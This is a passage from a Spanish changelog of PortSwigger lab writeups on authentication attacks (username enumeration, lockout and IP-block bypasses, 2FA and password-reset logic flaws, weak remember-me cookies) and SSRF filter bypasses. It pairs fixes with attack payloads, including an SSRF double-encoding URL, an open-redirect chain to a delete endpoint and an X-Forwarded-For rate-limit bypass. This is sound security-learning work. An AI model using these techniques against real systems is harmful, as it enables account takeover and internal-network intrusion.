2. **El "remember me" sortea TODAS las defensas del login form**. El lab anterior tenia rate-limit, lockout, account-lockout-as-oracle. Este endpoint (`GET /my-account`) no aplica ninguna de esas defensas porque el defender consideró la cookie "menos crítica". Es exactamente al revés: una sesión persistente que pasa por todas las defensas del login form es MAS critica que el login form mismo. Lección de auditoría: pedir el código del flow de remember-me antes que el del login.
3. **El patrón correcto es opaque session token**: `secrets.token_urlsafe(32)` random, almacenado en server-side store con metadata (expiración, IP, user-agent, revocation). El cliente lleva una clave de busqueda, no estado. Compromiso de la DB ≠ compromiso de cookies. Revocación server-side instantánea.
4. **Variantes mas modernas siguen rotas**: SHA-256 sin salt es peor (mas rapido); bcrypt en cookie cliente-side sigue dando cookies validas tras DB leak; AES_encrypt(KEY,...) cae si KEY se extrae del binario; JWT-HS256 cae si secret es brute-forceable. Solo opaque tokens con server-side lookup son robustos por construcción.
5. **Diferencias estructurales con el lab anterior**: cookie no incrementa contador del login form, MD5 toma <1µs vs bcrypt 100-200ms, no hay account locking, deteccion de exito por marker `Update email` (boton solo visible autenticado). 2 segundos vs 1.5 minutos del lab anterior.
6. **Decisión de estructura del inventario**: el tema no encajaba en `explotacion-brute-force-advanced.md` (esta es session/cookie security, no brute-force al login). Creado archivo nuevo `04-explotacion/web/explotacion-session-cookies-debiles.md` que cubre el cluster: cookies que codifican credenciales, remember-me tokens, session tokens predictables. MITRE T1539 + T1110.001. Hogar para futuros labs de session-mgmt de PortSwigger.

### Archivos nuevos
- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/writeup.md`**: 7 secciones con análisis de los 3 antipatterns, código del antipattern vs fix con opaque tokens, tabla comparativa con login form attacks, diagrama Mermaid.
- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/cookie_brute.py`**: script de ~70 líneas que itera passwords, arma `base64(target:md5(pwd))`, GET /my-account?id=target con cookie, detecta marker `Update email`.
- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/passwords.txt`**: wordlist canónica de PortSwigger.
- **`inventario/04-explotacion/web/explotacion-session-cookies-debiles.md`**: archivo nuevo del inventario. Cubre cookies derivadas, opaque vs derived tokens, herramientas (Burp Sequencer, CookieMonster, flask-unsign, hashcat), workflow Burp Intruder con payload processing, y patrón correcto de session management. MITRE [T1539, T1110.001].

### Conexión inventario
- Inventario crece a **132 archivos** (era 131). `04-explotacion/web/INDEX.md` regenerado con la nueva entrada. `TOPICS.md` y los 4 facetados (`by-mitre`, `by-difficulty`, `by-platform`, `by-fase`) regenerados.
- Cross-references: el nuevo archivo lista en `related:` a `explotacion-jwt` y `explotacion-brute-force-advanced` (puentes naturales).

### Verificación
- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
- Lab marcado solved: `<section class='academyLabBanner is-solved'>`.

---

## [2026-05-07] — Writeup PortSwigger 2FA broken logic + script `bruteforce.py`

Lab Practitioner que extiende la serie de MFA bypass. A diferencia de "2FA simple bypass" (donde el paso 2 no se enforce server-side), acá el paso 2 sí enforcea pero el server identifica al usuario a verificar mediante una cookie `verify=<username>` controlable por el cliente, en vez de derivarla de la sesión del paso 1. Combinado con OTP de 4 dígitos sin rate-limit, takeover trivial. Resolución real: ~1 minuto con script Python paralelo, código `0239` para carlos.

### Hallazgos no triviales documentados en el writeup

1. **Composición de dos defectos de severidad media → severidad crítica**: confusión de identidad (`verify` cookie controlable) y OTP sin rate-limit son cada uno problema serio pero acotado. Juntos: el atacante puede *generar* un OTP válido para carlos en su propia sesión y *brute-forcearlo* sin lockout. La fix de cualquiera de los dos rompe la cadena, lo que ilustra defensa en profundidad como "capas distintas" no "capas iguales".
2. **Identidad debe derivar de sesión, no del cliente**: la cookie `verify=carlos` plaintext es el antipatrón canónico, cede al cliente la autoridad sobre "qué usuario está siendo verificado". La implementación correcta guarda `user_id` y `stage=PENDING_OTP` en sesión server-side; el paso 2 nunca consulta cookies/params del cliente para identidad. Mismo patrón que IDOR clásico (`?account_id=42`), privesc por hidden input, mass assignment.
3. **OTP debe ligarse a `(user_id, session_id)`, no solo a user**: un código emitido en sesión A no debería validar en sesión B aunque el username coincida. Esto rompe el ataque incluso si `verify` cookie sigue siendo manipulable.
4. **Server rota la sesión incluso en intentos fallidos**: el `Set-Cookie: session=...` aparece tanto en éxito como en error de OTP. Típicamente la rotación es solo en éxito (anti session-fixation). Hacerla siempre sugiere implementación apresurada y no aporta seguridad. No afecta el brute-force porque el script reusa la cookie del template ignorando los `Set-Cookie` del server.
5. **Diferencia conceptual con simple bypass**: simple bypass = estado mal modelado (no hay distinción `PENDING_OTP` vs `AUTHENTICATED`). Broken logic = identidad mal atribuida (sesión y target del 2FA desacoplados). Ambos llevan al mismo resultado por mecanismos distintos; las fix son distintas.
6. **Burp Community vs Python paralelo**: Intruder Community throttlea a ~1 req/s (~3h peor caso para 10⁴). `ThreadPoolExecutor` con 30 workers cubre los 10.000 candidatos en <1 minuto. Relevante para pentest real: la "ventana de explotación" cambia de horas a minutos, y los defenders tienen que dimensionar rate-limits asumiendo paralelismo agresivo, no la velocidad de Intruder Community.

### Archivos nuevos
- **`learning/portswigger/2fa-broken-logic/writeup.md`**: 7 secciones con datos reales de la corrida (cookies, códigos OTP, longitudes), tabla comparativa simple bypass vs broken logic, código del antipatrón vs implementación correcta del state machine + binding de OTP a sesión, sección sobre por qué Burp Community no escala, diagrama Mermaid de la cadena.
- **`learning/portswigger/2fa-broken-logic/bruteforce.py`**: ~120 líneas, `ThreadPoolExecutor` de 30 workers, refresca OTP cada N intentos vía `--refresh-every`, detecta éxito por status 302, captura la session post-2FA y emite comando `curl` listo para `/my-account?id=carlos`.

### Conexión inventario
- `explotacion-mfa-bypass.md`: + `portswigger/2fa-broken-logic` en `learning_refs:` (2 writeups ahora junto a `2fa-simple-bypass`).

### Verificación
- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado vía curl.

---

## [2026-05-07] — Writeup PortSwigger Username enumeration via account lock

Lab Practitioner que cierra el cluster de username enumeration con un signal nuevo: **lockout asimétrico**. El defender introduce account-lockout (5 fails consecutivos → cuenta bloqueada 1 min) como protección anti-brute-force, pero solo lockea cuentas existentes. La asimetría revela existencia: usernames inválidos siempre devuelven `Invalid`; el válido cambia a `Too many incorrect login attempts` tras 5 attempts. Credenciales: `app:111111`.

### Hallazgos no triviales documentados en el writeup

1. **El error de modelo costoso**: mi primer enfoque diseñó phase 2 con batches de 4 y waits de 65s para no relockear durante el brute-force, asumiendo que el lock era obstáculo a evitar. Estimación: 40+ minutos. **Realidad observada**: el lock fired al 4° intento del primer batch. El contador no decae completamente al expirar el lock — queda en 2-3 (decay parcial). Modelo del decay equivocado.
2. **El truco del PortSwigger writeup oficial**: NO batchear, NO esperar. Blastear los 100 passwords contra la cuenta lockeada. La mayoría responden con marker de lock; **una respuesta no contiene ningún marker de error** — esa es el password correcto. El check de credenciales sucede independiente del lockout: si el pwd es correcto, la respuesta cambia (length 3158 vs 3236) aunque la cuenta esté bloqueada. **25× más rápido** (1.5 min vs 40 min).
3. **El lock no enmascara el oracle de phase 2; lo desplaza**. El instinto de tratar el lock como obstáculo en vez de como signal nuevo fue el error conceptual. El password correcto destaca por *ausencia* de marker contra el background uniforme de respuestas locked. Misma idea que phase 1 (la asimetría es el signal), aplicada en otro nivel.
4. **Las dos asimetrías del lockout naive**: (a) asimetría en quién acumula counter (existe vs no existe → cierra phase 1); (b) asimetría en respuesta cuando pwd es correcto bajo lock (cualquier rama distinta para `(pwd correcto, locked)` filtra → cierra phase 2). Fix correcto requiere counter universal (con TTL) Y respuesta byte-idéntica en los 4 cuadrantes del producto `(user existe) × (lock activo)`.
5. **Lockout NO es defensa standalone**: mal implementado, downgrade defensivo. Introduce signals que el atacante no tendría sin el lockout. Necesita combinarse con counter universal, respuesta uniforme, decay (no lock duro), y idealmente captcha+2FA.
6. **Lección meta-cognitiva**: cuando el costo de una técnica parece desproporcionado al problema, parar y verificar contra fuente externa. La diferencia entre 40 min y 1.5 min no era optimización sino cambio de modelo. Pedagógicamente lo más valioso del lab.

### Iteración real de debugging documentada

El writeup §3.2 documenta el camino completo: versión inicial con batches abortando al 4° intento, lectura del writeup oficial revelando el blast-through, reescritura del script con classify(), verificación. No oculta el error inicial — es el insight central del lab.

### Archivos nuevos
- **`learning/portswigger/username-enumeration-via-account-lock/writeup.md`**: 7 secciones con tabla de los 4 cuadrantes (user existe × lock activo), código del antipatrón vs fix, comparación con los 4 labs anteriores de auth, diagrama Mermaid.
- **`learning/portswigger/username-enumeration-via-account-lock/bruteforce.py`**: 3 fases (enum por marker, blast con classify en buckets locked/invalid/neither/success, verify con sleep+login). Soporta `--known-user` para saltar phase 1.
- **`learning/portswigger/username-enumeration-via-account-lock/{usernames,passwords}.txt`**: wordlists copiadas de labs anteriores (PortSwigger usa lista canónica).

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/username-enumeration-via-account-lock` en `learning_refs:` (5 writeups ahora). + 3 aliases nuevos: `account lock as oracle, lockout asymmetry, blast through lockout`.

### Verificación
- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes).
- Lab marcado solved: `<section class='academyLabBanner is-solved'>`.

---

## [2026-05-07] — Writeup PortSwigger Broken brute-force protection, IP block

Lab Practitioner que cierra el cluster de protección contra brute-force después de la serie de username enumeration. La defensa parece sólida (3 fallos consecutivos por IP → lock), pero contiene una falla **lógica explícita**: cualquier login exitoso desde esa IP resetea el contador. Atacante con cuenta propia (`wiener:peter`) puede intercalar logins exitosos entre intentos contra `carlos`, manteniendo el contador siempre por debajo del threshold. Credenciales encontradas: `carlos:yankees` (posición 85 del wordlist).

### Hallazgos no triviales documentados en el writeup

1. **Reset-on-any-success es un antipattern silencioso**. La defensa parece estricta vista en aislamiento ("3 fallos → bloqueo") pero la regla de reset la hace inerte ante cualquier atacante con una cuenta válida. La auditoría debe revisar siempre las reglas de **exención** del rate-limit, no sólo el threshold y el window.
2. **Counter dual per-(IP) + per-(username) sin reset on success** es la versión correcta. Per-IP frena password spraying multi-cuenta desde una IP; per-username frena brute-force concentrado distribuido. Combinarlos sin reset (sólo decay temporal o ventana deslizante) cierra ambos vectores.
3. **El nuevo trade-off introducido**: counter per-username permite que un atacante bloquee la cuenta ajena (DoS trivial: 3 intentos basura contra `carlos:anything`). Mitigación: **captcha tras N en vez de lock duro** + 2FA para cuentas críticas. Lock duro es siempre DoSeable, captcha no.
4. **Cadencia de interleave con margen**: usar `reset-every=2` en vez de 3 (al límite del threshold) absorbe glitches de red, retries duplicados y ventanas de carrera. Costo extra: 50% más requests de reset (50 wieners vs 33). Trivial frente al beneficio de robustez.
5. **Single-threaded por construcción**: a diferencia del lab de timing donde concurrencia paralelizaba enumeración, acá la concurrencia rompería la garantía del intercalado. El orden importa porque los resets tienen que ocurrir *entre* intentos contiguos.
6. **Comparación con bypass por XFF spoofing**: el lab de username enumeration via response timing tenía rate-limit por IP también, pero el bypass fue spoofear `X-Forwarded-For`. Acá ese vector no aplica (probablemente el server lee la IP del socket); pero la falla lógica de reset es independiente del mecanismo de identificación de la IP. Cierre por XFF no defiende contra reset-on-success y viceversa.

### Verificación end-to-end

Script ejecutado contra instancia real del usuario: 100 candidate passwords con interleave 1:2, encontró `yankees` en posición 85. Verificación post-ataque (login + GET /my-account?id=carlos): banner del lab cambió a `<section class='academyLabBanner is-solved'>`. Lab marcado como solved.

### Archivos nuevos
- **`learning/portswigger/broken-bruteforce-protection-ip-block/writeup.md`**: 7 secciones con análisis de la falla lógica, código del antipatrón vs fix, tabla comparativa de bypasses de rate-limit, y diagrama Mermaid del intercalado.
- **`learning/portswigger/broken-bruteforce-protection-ip-block/bruteforce.py`**: script secuencial con `--reset-every` configurable, detección por status 302 + Location, abort en marker `BLOCKED` para diagnosticar fallos del intercalado.
- **`learning/portswigger/broken-bruteforce-protection-ip-block/passwords.txt`**: lista oficial de candidate passwords de PortSwigger.

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/broken-bruteforce-protection-ip-block` en `learning_refs:` (ahora 4 writeups, los 3 de enum + este). + 3 aliases nuevos: `reset-on-success counter bypass, interleaved login attack, broken bruteforce protection`.

### Verificación
- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger Username enumeration via response timing

Tercer y último lab de la serie de username enumeration (Practitioner). Body+status uniformes; signal exclusivamente en **timing**: el server hace bcrypt sólo cuando el username es válido, short-circuit si no existe. **Ultimo nivel de la tabla de signals (nivel 6)**. Adicional: rate-limit por IP que se bypassea con `X-Forwarded-For: <random IP>` única por request. Credenciales: `auto:jordan`.

### Hallazgos no triviales documentados en el writeup

1. **Más bytes en payload no necesariamente ayudan, pueden empeorar**. Probé tres configuraciones: 50KB con 8 workers (spread 160ms, falso positivo `admin`), 1MB con 4 workers (spread *peor* 70ms, falso positivo `agent`), y 100 bytes con `workers=1` (spread 450ms, outlier real `auto` 1166ms vs baseline 725ms). Razón: bcrypt trunca el input a 72 bytes (limit del algoritmo); más bytes sólo amplifican la transmisión TCP y parsing, sumando noise uniforme que ahoga el signal.
2. **Workers concurrentes pelean por bandwidth y server threads**. Sequential (`workers=1`) elimina contention TCP, queueing del server y congestion control jitter. Para timing attacks, sequential beats concurrent salvo que la red sea muy estable.
3. **`X-Forwarded-For` como bypass de rate-limit per-IP**: vector clásico cuando el server confía en headers para identificar al cliente. La defensa real es usar `REMOTE_ADDR` (IP de la conexión TCP) o validar que XFF venga de un proxy confiable upstream (validar peer IP).
4. **bcrypt-as-oracle**: bcrypt está diseñado para ser lento (cost factor 10-12). En auth offline esa lentitud defiende contra brute-force; en auth online la misma lentitud es el side-channel. Patrón antipatrón canónico: `if user is None: return error()` short-circuit en ms; `else: bcrypt.checkpw(...)` toma 100-200ms. El código limpio: hashear contra `DUMMY_HASH` precomputado en la rama "user not found" para igualar costos. Fix de 2-3 líneas.
5. **Tabla de niveles de signal completa la serie**: lab #1 nivel 2 (length differential 2 bytes); lab #2 nivel 5 (byte-level differential, mismo length); lab #3 nivel 6 (timing differential, body byte-idéntico). Cada lab cierra la defensa del anterior y abre nueva. La serie enseña que defenderse de uno no defiende del siguiente: respuesta uniforme en bytes no es suficiente sin constant-time response.

### Iteración real del calibrado

Documentado en el writeup §3.2: tres intentos con configuraciones distintas, mostrando que el sweet spot es contraintuitivo (100 bytes + sequential, no 1MB + concurrent). Pedagógicamente valioso para entender por qué timing attacks requieren disciplina experimental, no sólo "lanzar el script más agresivo posible".

### Archivos nuevos
- **`learning/portswigger/username-enumeration-via-response-timing/writeup.md`**: 7 secciones con tabla comparativa de los 3 labs de username enum, mecánica de bcrypt-as-oracle con código antipatrón vs correcto, y diagrama Mermaid de la cadena.
- **`learning/portswigger/username-enumeration-via-response-timing/bruteforce.py`**: script con timing-based fingerprint (median de N trials), `X-Forwarded-For` random per request, configurable workers/trials/pwd-bytes para experimentación.
- **`learning/portswigger/username-enumeration-via-response-timing/{usernames,passwords}.txt`**: wordlists copiadas del lab #1.

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/username-enumeration-via-response-timing` en `learning_refs:` (ahora 3 writeups en este archivo, los tres de username enum). + 5 aliases nuevos: `timing attack, response timing differential, bcrypt timing oracle, X-Forwarded-For rate-limit bypass, IP-based rate limit bypass`.

### Verificación
- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger Username enumeration via subtly different responses

Variante Practitioner del lab #1 de Auth. Misma técnica conceptual (enum por response differential) pero la diferencia es **un solo byte oculto en el mensaje de error**: username válido devuelve `"Invalid username or password "` (espacio al final) en vez de `"Invalid username or password."` (punto). **Mismo length, distinto último char**. Para enmascararlo, el response tiene noise random (analytics ID con dígitos variables + comentario HTML opcional) que hace variar el length total entre 3335-3356 bytes.

### Hallazgos no triviales documentados en el writeup

1. **Length-based detection tiene techo bajo cuando el server tiene noise random**. Para signals < 20 bytes, el noise random (CSRF tokens, analytics IDs, comentarios opcionales) domina el delta. Hay que escalar a content-level fingerprinting: extraer el campo de interés con regex y comparar exactamente.
2. **Niveles de detección de signals**, en orden de robustez decreciente: status code → body length → hash de body → hash de content extraído → byte específico de campo extraído → timing. Cada lab en la serie sube de nivel; este requiere nivel 5 (byte específico).
3. **Multi-trial consensus filtra noise estable**: con response no determinístico (mismo input produce distintos hashes), exigir signal idéntico en N trials. 3 trials descartan noise <50% efectivamente. El script v2 lo implementa con `if len(set(signals)) == 1` antes de aceptar como outlier.
4. **Casi descarté el lab antes de ver el hint**: análisis fue (a) length tiene noise → no sirve; (b) hash de content limpio → todos idénticos; (c) conclusión preliminar "no hay signal". El error: el byte-level differential requiere una **hipótesis sobre dónde mirar**. Sin la hipótesis, "diff de cada campo posible" es impráctico exhaustivamente. Hint del lab fue equivalente al thread de un security researcher diciendo "el bug está en el mensaje de error".
5. **Burp Comparer es la herramienta canónica para detectar este nivel** en auditorías reales sin hint: comparación visual byte-a-byte entre dos responses con highlight de diferencias. Después de identificar el campo con Comparer, automatizar con Intruder + grep-extract o script con regex.
6. **Padding aleatorio como contramedida**: cuando no se puede garantizar que ramas del código generen response byte-idéntico, agregar token random de longitud fija que iguale lengths. Es defensa "de fuerza bruta" cuando la respuesta uniforme literal es muy difícil arquitecturalmente.

### Iteración del flow de debugging

El writeup documenta el camino real (no el final limpio): primer intento length-based falló (85 outliers); intento de normalización agresiva mostró que content limpio era byte-idéntico para todos los usernames; búsqueda en hint del lab reveló el byte exacto; reescritura del fingerprint a "último char del warning message"; consenso de 3 trials para descartar noise; outlier limpio (`adkit` con espacio, contra 100 con punto); fase 2 de password reveló `freedom` por 302/0 outlier.

### Archivos nuevos
- **`learning/portswigger/username-enumeration-via-subtly-different-responses/writeup.md`**: 7 secciones con tabla de niveles de detección de signals, comparación con lab Apprentice, y diagrama Mermaid.
- **`learning/portswigger/username-enumeration-via-subtly-different-responses/bruteforce.py`**: variante del script anterior con fingerprint por último char del warning message + multi-trial consensus para filtrar noise.
- **`learning/portswigger/username-enumeration-via-subtly-different-responses/{usernames,passwords}.txt`**: wordlists copiadas del lab Apprentice (mismas).

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/username-enumeration-via-subtly-different-responses` en `learning_refs:` (ahora 2 writeups en este archivo, ambos sobre username enum).

### Verificación
- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger Password reset broken logic + nuevo explotacion-password-reset-flaws.md

Tercer lab de Authentication, primero del subgrupo Other mechanisms (Apprentice). El form de reset incluye `username` como hidden field; el server valida el token correctamente pero usa el `username` del request para decidir a quién aplicar el cambio de password. Tampering del campo: `wiener` → `carlos`, password `password`. Login como carlos con la nueva password. Lab solved.

### Hallazgos no triviales documentados en el writeup

1. **Confused deputy aplicado a password reset**: el server tiene autoridad legítima para cambiar passwords pero deriva el target del request del cliente, no de su propio estado (BD). El cliente miente sobre la identidad y el server obedece. La fix es de una línea: usar `token.user` en vez de `User.find(username=request.form['username'])`.
2. **Hidden inputs en flujos sensibles son red flag universal**. Si un campo no necesita ser cliente-controlable (por diseño de la operación), no debería estar como input. Cuando aparece, asumir que el bug está ahí hasta probar lo contrario.
3. **Smell heurístico**: el campo `username` en form de reset es señal canónica del bug. La pregunta de diseño correcta: "¿cómo el server identifica al usuario que está reseteando?" Si la respuesta involucra al cliente, bug.
4. **Schema correcto del token**: `(token PK, user_id FK, expires_at, consumed_at)`. Token tiene un user dueño en BD; identidad se deriva de esa relación; tras uso se invalida. Cuatro principios juntos.
5. **Por qué este bug es frecuente en producción**: tentación de "pasar todo al backend para no perder contexto" (frontend embebe username como hidden), migraciones a microservicios sin re-pensar el modelo (el endpoint de reset no tiene acceso a la tabla de tokens), tests que cubren happy path no detectan el tampering.

### Nuevo archivo de inventario
- **`inventario/04-explotacion/web/explotacion-password-reset-flaws.md`**: cubre password reset bugs como categoría con 8 sub-clases documentadas (token no ligado al usuario, predecible, leakeado vía Referer, sin expiración, host header poisoning, response differential enum, sin rate-limit, brute-force de token de baja entropía). MITRE T1556. 13 aliases ricos. `related: [explotacion-mfa-bypass, explotacion-brute-force-advanced, explotacion-jwt]`. Anchor para los próximos labs de la serie Other Mechanisms.

### Archivos nuevos
- **`learning/portswigger/password-reset-broken-logic/writeup.md`**: 7 secciones con tabla comparativa de clases de bugs en password reset, schema correcto en pseudo-código, y diagrama Mermaid de la cadena.

### Conexión inventario
- `explotacion-password-reset-flaws.md`: + `portswigger/password-reset-broken-logic` en `learning_refs:`.

### Verificación
- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes tras regenerar).

---

## [2026-05-06] — Writeup PortSwigger 2FA simple bypass + nuevo archivo inventario explotacion-mfa-bypass.md

Segundo lab de la serie Authentication, primero del subgrupo Multi-Factor (Apprentice). El server marca la sesión como totalmente autenticada tras el paso 1 (`/login` con username:password); el paso 2 (`/login2` con OTP) es decorativo. Bypass: login del paso 1 con `carlos:montoya`, **no completar paso 2**, navegar directo a `/my-account?id=carlos` con la cookie de sesión recibida en paso 1. Lab solved.

### Hallazgos no triviales documentados en el writeup

1. **Auth state vs auth ceremony**: el flujo del 2FA es ceremonia UX (redirects, JS, mensajes); el estado real de auth vive en el server. Cuando el server reduce dos estados ("paso 1 OK" vs "paso 1 + paso 2 OK") a una variable booleana `is_logged_in`, el cliente ignora el paso 2 y navega directo a recursos protegidos.
2. **Frontend-only enforcement como anti-pattern universal**: redirects, JavaScript, localStorage flags, headers controlables por el cliente, hidden inputs. Cualquier defensa que dependa del comportamiento del cliente es teatro.
3. **Implementación correcta requiere state machine explícito**: enum `SessionStage = {UNAUTHENTICATED, PENDING_OTP, AUTHENTICATED}`. Paso 1 setea `PENDING_OTP`; sólo paso 2 exitoso lo promueve a `AUTHENTICATED`; rotación de session ID tras paso 2 (anti session-fixation); endpoints sensibles exigen `AUTHENTICATED`.
4. **Disciplina pedagógica del recon**: probar el bypass primero con la cuenta legítima propia (`wiener:peter`), no con la víctima. Validar el modelo del server con la cuenta propia evita gastar intentos contra la víctima si la vulnerabilidad no aplica.
5. **MFA mal implementado es peor que no tener MFA**: da falsa sensación de defensa. Implementación rota = fricción para usuarios legítimos sin protección real contra atacantes.

### Nuevo archivo de inventario
- **`inventario/04-explotacion/web/explotacion-mfa-bypass.md`**: cubre la categoría completa de bypass MFA/2FA con 7 sub-categorías documentadas (auth state mal modelado, frontend-only enforcement, brute-force OTP, cambio de usuario entre pasos, response manipulation, OTP no expira, response differential). MITRE T1556.006. Aliases ricos para discoverabilidad: 14 variantes ES/EN incluidas (`MFA bypass, 2FA bypass, OTP bypass, broken auth state, intermediate session bypass, skip second factor`, etc.). `related: [explotacion-brute-force-advanced, explotacion-jwt, explotacion-auth-bypass-oauth]`. Va a ser el anchor para los próximos labs de MFA en la serie.

### Archivos nuevos
- **`learning/portswigger/2fa-simple-bypass/writeup.md`**: 7 secciones con tabla comparativa de clases de bypass MFA, implementación correcta del state machine en pseudo-código, y diagrama Mermaid de la cadena.

### Conexión inventario
- `explotacion-mfa-bypass.md`: + `portswigger/2fa-simple-bypass` en `learning_refs:`.

### Verificación
- `bash scripts/check.sh` ✓ (144 archivos validados, 144/144 OK, indexes idempotentes tras regenerar).

---

## [2026-05-06] — Writeup PortSwigger Username enumeration via different responses + script bruteforce.py

Primer lab de la serie Authentication (Apprentice). El login form responde "Invalid username" (length 3244) cuando el usuario no existe y "Incorrect password" (length 3246) cuando existe pero el password está mal. Diferencia textual de 2 bytes que se automatiza por response-length outlier. Side-channel divide el espacio de 100×100 = 10k a 100+100 = 200 requests (**reducción de 50x**).

Burp Community throttlea Intruder, así que escribí `bruteforce.py` (paralelo, 20 workers, dos fases secuenciales) que termina ambas en ~10s. Output del run real: fase 1 detectó username `acceso` por outlier `(200, 3246)` contra 100 hosts en `(200, 3244)`; fase 2 detectó password `1qaz2wsx` por outlier `(302, 0)` contra 99 en `(200, 3246)`.

### Hallazgos no triviales documentados en el writeup

1. **Side-channels en auth son la categoría más explotable**, no sólo texto del error: length, status code, timing (bcrypt sólo si user existe → short-circuit timing differential), cookies set, lockout differential per-user, status del endpoint de password reset. El defender debe cerrar **todos**, no sólo el más obvio. Mensaje uniforme + status uniforme + constant-time + sin Set-Cookie diferenciado.
2. **Constant-time response es defensa orthogonal y no opcional**. Aunque el texto y length se igualen, sin hash dummy en la rama "user not found" el atacante mide latencia y descubre usernames válidos por respuesta lenta. La fix: en rama de fallo de username, hashear el password contra `DUMMY_HASH` precomputado para igualar el costo computacional al del bcrypt real.
3. **Rate limiting per-IP + per-username** son ortogonales: solo per-IP permite distributed brute-force; solo per-user habilita username enumeration vía lockout differential. Hay que combinarlos. Con jitter en el lockout para no entregar el timing exacto.
4. **Username enumeration + password spraying se complementan en sistemas reales con lockout**. Enum con un password dummy compartido (no aumenta intentos malos contra ningún user específico); spraying de uno o dos passwords comunes para bypass del lockout per-user.
5. **El cambio de status 200→302 en el login exitoso es la firma más fuerte de fase 2**, mejor que length differential. Diseño común: 200 con re-render del form y mensaje de error vs 302 con `Location: /my-account` y body vacío.

### Archivos nuevos
- **`learning/portswigger/username-enumeration-via-different-responses/writeup.md`**: 7 secciones con tabla de side-channels en auth, mecánica de la fix con constant-time, y diagrama Mermaid de la cadena.
- **`learning/portswigger/username-enumeration-via-different-responses/bruteforce.py`**: script reutilizable con detección de outlier por `(status, length)` fingerprint. Sirve para cualquier lab de login con response differential cambiando wordlists.
- **`learning/portswigger/username-enumeration-via-different-responses/usernames.txt`** y **`passwords.txt`**: wordlists oficiales de PortSwigger guardadas localmente.

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + 12 aliases (`brute force, password guessing, username enumeration, account enumeration, side-channel auth, response differential, observable response discrepancy, login form fuzzing, credential bruteforce, hydra, medusa, password spraying`). + `related: [explotacion-password-spraying]` (cross-link al pair conceptual). + `learning_refs: [portswigger/username-enumeration-via-different-responses]`.

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger SSRF with whitelist-based input filter + PENDING blind shellshock

Quinto lab de SSRF (Practitioner). Whitelist estricta del dominio del microservicio de stock (`stock.weliketoshop.net`); bypass por **parser differential sobre el componente host/userinfo de la URL** usando double encoding del `#`. Payload final: `stockApi=http://localhost:80%[email protected]/admin/delete?username=carlos`.

### Mecánica del bypass (decodificación asimétrica)

| Componente | Pasadas de decode sobre `%2523` | Qué ve | Decisión |
|---|---|---|---|
| Form parser | 1 (`%2523` → `%23`) | `%23` literal en string | entrega valor al filtro |
| Filtro de whitelist | 0 (URL parser preserva `%XX` en userinfo) | `userinfo=localhost:80%23`, `host=stock.weliketoshop.net` | match → pasa |
| HTTP client (basic auth handling) | 1 más (`%23` → `#`) | re-procesa: `host=localhost`, `fragment=@stock...` | conecta a localhost |

El bypass vive en el gap: filtro hace 1 decode (form), cliente HTTP hace 2 (form + userinfo basic-auth). El target final no es el que la whitelist validó.

### Hallazgos no triviales documentados en el writeup

1. **Las clases de bypass se generalizan a través de los componentes URL**. Lab #3 fue double encoding sobre **path** (`%2561dmin`); este lab es double encoding sobre **userinfo** (`%2523`). Misma idea, distinto componente. Aprender la clase, no el truco.
2. **Whitelists son tan rotas como blacklists cuando hay parser differential**. La fortaleza nominal de "enumerar lo bueno" depende de que el componente que valida y el que ejecuta vean el mismo host.
3. **Fix raíz: canonicalizar antes de validar**. `urlparse(url).hostname` (descarta userinfo automáticamente), rechazar `parsed.username`/`parsed.password`/`parsed.fragment`, validar IP post-DNS, conectar usando IP resuelta. Eso cierra la clase.
4. **Tres errores didácticos del flujo real**: (a) asumí dominio `weliveshecurity.net` cuando el lab usaba `weliketoshop.net` (ignoré que el error 400 era hint explícito); (b) invertí la dirección de `%2523`/`@` (puse el dominio confiable adelante en vez de detrás del `@`); (c) usé `%23` simple en vez de `%2523`. Los tres están en sección §4 del writeup como aprendizaje genuino del proceso.

### Archivos nuevos
- **`learning/portswigger/ssrf-with-whitelist-filter/writeup.md`**: 8 secciones, énfasis en parser differential sobre componente host de URL, comparación con la generalización a otros componentes (path, scheme, query), y tres errores comunes vividos al resolverlo.

### Conexión inventario
- `analisis-ssrf.md`: + `portswigger/ssrf-with-whitelist-filter` en `learning_refs:` (6 writeups SSRF: loopback, backend discovery, blacklist bypass, open redirect chain, **whitelist parser differential**, XXE→IMDS).

### PENDING actualizado
- `learning/portswigger/PENDING.md`: añadido **Blind SSRF with Shellshock exploitation** (https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation). Razón: `infra-externa-bloqueada-por-firewall + canal de exfil exclusivamente OAST`. Cadena multietapa (SSRF en `Referer` + sweep para descubrir CGI + Shellshock vía `User-Agent` + DNS exfil del whoami a Collaborator). Payload listo para retomar con Burp Pro.

### Verificación
- `bash scripts/check.sh` ✓ (143 tests, 129/129 frontmatter OK, indexes idempotentes).

---

## [2026-05-06] — Writeup PortSwigger SSRF filter bypass via open redirection

Cuarto lab de SSRF (Practitioner). Cambia la clase de bypass: el filtro sobre `stockApi` ahora es allowlist same-origin (estricta y "correcta" en su contexto), pero el lab tiene un open redirect en `/product/nextProduct?path=` dentro del propio dominio. Se encadenan: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`. El filtro valida el primer hop (same-origin), el cliente HTTP del back-end sigue automáticamente la 302 al destino externo.

### Hallazgos no triviales documentados en el writeup

